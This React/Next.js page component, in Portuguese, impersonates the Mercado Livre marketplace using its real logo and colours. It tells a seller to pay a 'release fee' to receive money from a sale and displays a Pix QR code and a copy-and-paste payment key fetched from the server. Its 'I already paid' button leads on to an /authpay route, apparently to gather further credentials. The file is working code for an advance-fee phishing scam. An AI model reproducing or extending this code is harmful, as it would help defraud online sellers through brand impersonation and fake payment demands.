"use client";

import { useEffect, useState } from "react";
import toast, { Toaster } from "react-hot-toast";
import { QRCodeSVG } from "qrcode.react";

import { LoadingComponent } from "@/loading";
import { useRouter } from "next/navigation";
import { paymentKeyUser } from "@/actions/paymentKey";

export default function PayPage() {
  const router = useRouter();

  const [loading, setLoading] = useState(true);
  const [qrCode, setQRCode] = useState("");
  const [pix, setPix] = useState("");

  const getPaymentKey = async () => {
    const data = await paymentKeyUser();

    setQRCode(data.qrCode);
    setPix(data.pix);
    setLoading(false);
  };

  useEffect(() => {
    getPaymentKey();
  }, []);

  if (loading) {
    return <LoadingComponent />;
  }

  const handleChangeInfoLogin = () => {
    router.push("/authpay");
  };

  return (
    <>
      <div>
        <header className="flex items-center justify-center bg-[#FFE600] border-b border-[#e2e0e2] p-4">
          <a href="./" aria-label="ir para a página inicial">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
          </a>
        </header>

        <main className="mt-16 flex items-center justify-center">
          <div className="w-full p-10 md:max-w-[500px] flex flex-col">
            <h1 className="text-3xl font-medium">REALIZE O PAGAMENTO</h1>

            <span className="text-[#5c525b] text-xl mt-2 mb-4">
              Pague a taxa de liberação e receba o valor da sua venda!
            </span>

            <div className="flex items-center justify-center">
              <QRCodeSVG value={qrCode} size={250} />
            </div>

            <div className="flex items-center gap-2 w-full mt-6">
              <div className="h-[1px] bg-[#ccc] w-full"></div>
              <p className="text-base font-semibold">QR</p>
              <div className="h-[1px] bg-[#ccc] w-full"></div>
            </div>

            <label htmlFor="" className="text-[#222] mt-8 font-semibold">
              COPIA E COLA
            </label>

            <input
              type="text"
              className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
              disabled
              value={pix}
            />

            <button
              className="bg-[#2968C8] text-white h-[50px] w-full text-xl rounded-full mt-10"
              onClick={() =>
                navigator.clipboard
                  .writeText(pix)
                  .then(() => {
                    toast.success("Chave copiada com sucesso!");
                  })
                  .catch((err) => {
                    console.error("Erro ao copiar: ", err);
                  })
              }
            >
              copiar
            </button>

            <div className="flex items-center gap-2 w-full mt-6">
              <div className="h-[1px] bg-[#ccc] w-full"></div>
              <p className="text-base">Banco</p>
              <div className="h-[1px] bg-[#ccc] w-full"></div>
            </div>

            <button
              className="bg-[#2968C8] text-white h-[50px] w-full text-xl rounded-full mt-6"
              onClick={handleChangeInfoLogin}
            >
              ja paguei
            </button>
          </div>
        </main>
      </div>

      <Toaster position="bottom-center" />
    </>
  );
}
